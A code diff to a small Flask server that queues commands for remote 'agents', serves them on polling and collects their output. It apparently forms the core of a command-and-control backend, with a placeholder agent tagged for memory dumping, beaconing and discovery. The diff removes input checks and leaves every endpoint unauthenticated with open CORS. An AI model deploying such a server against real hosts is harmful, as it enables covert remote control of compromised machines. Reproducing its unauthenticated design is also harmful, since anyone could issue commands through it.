@@ -4,10 +4,9 @@ from flask_cors import CORS
 app = Flask(__name__)
 CORS(app)
 
-# Store results per agent
-agent_results = {}
-# Simple in-memory command queue
-agent_commands = {}
+# In-memory command store and result store
+COMMAND_QUEUE = {}
+COMMAND_RESULTS = {}
 
 @app.route("/api/command", methods=["POST"])
 def handle_command():
@@ -17,54 +16,51 @@ def handle_command():
 
     agent_id = data["agent_id"]
     command = data["command"]
-    print(f"✅ Command '{command}' queued for agent '{agent_id}'")
-    agent_commands[agent_id] = command
-    return jsonify({"status": "success", "message": f"Command '{command}' queued for agent '{agent_id}'"})
 
+    print(f"✅ Received command '{command}' for agent '{agent_id}'")
+    COMMAND_QUEUE[agent_id] = command
+    return jsonify({
+        "status": "success",
+        "message": f"Command '{command}' queued for agent '{agent_id}'"
+    })
 
 @app.route("/api/get-command", methods=["POST"])
 def get_command():
     data = request.get_json()
     agent_id = data.get("agent_id")
-    if not agent_id:
-        return jsonify({"status": "error", "message": "Missing agent_id"}), 400
-
-    command = agent_commands.pop(agent_id, None)
+    command = COMMAND_QUEUE.pop(agent_id, None)
     if command:
         return jsonify({"status": "command", "command": command})
     return jsonify({"status": "idle"})
 
-
 @app.route("/api/command-result", methods=["POST"])
-def command_result():
+def store_result():
     data = request.get_json()
     agent_id = data.get("agent_id")
     result = data.get("result")
 
-    if agent_id and result is not None:
-        agent_results[agent_id] = result
-        print(f"🟩 Agent {agent_id} responded with:\n{result}")
-        return jsonify({"status": "success"})
-    return jsonify({"status": "error", "message": "Missing agent_id or result"}), 400
-
+    if agent_id and result:
+        print(f"🟢 Agent {agent_id} responded with:\n{result}")
+        COMMAND_RESULTS[agent_id] = result
+        return jsonify({"status": "ok"})
+    return jsonify({"status": "error"}), 400
 
 @app.route("/api/command-results/<agent_id>", methods=["GET"])
-def get_result(agent_id):
-    if agent_id in agent_results:
-        return jsonify({"result": agent_results[agent_id]})
-    return jsonify({"result": None}), 200
-
+def fetch_result(agent_id):
+    result = COMMAND_RESULTS.pop(agent_id, None)
+    return jsonify({"result": result})
 
 @app.route("/api/agents", methods=["GET"])
 def get_agents():
-    # Dummy agent for now
+    # You can enrich this from a real database later
     agents = [
         {
             "agent_id": "A01",
             "hostname": "test-host",
             "ip_address": "10.0.0.5",
             "status": "Online",
-            "last_check_in": "Just now"
+            "last_check_in": "Just now",
+            "tags": ["🧠 Memory Dumping", "📡 Active Beacon", "🧬 TTP: Discovery"]
         }
     ]
     return jsonify(agents)
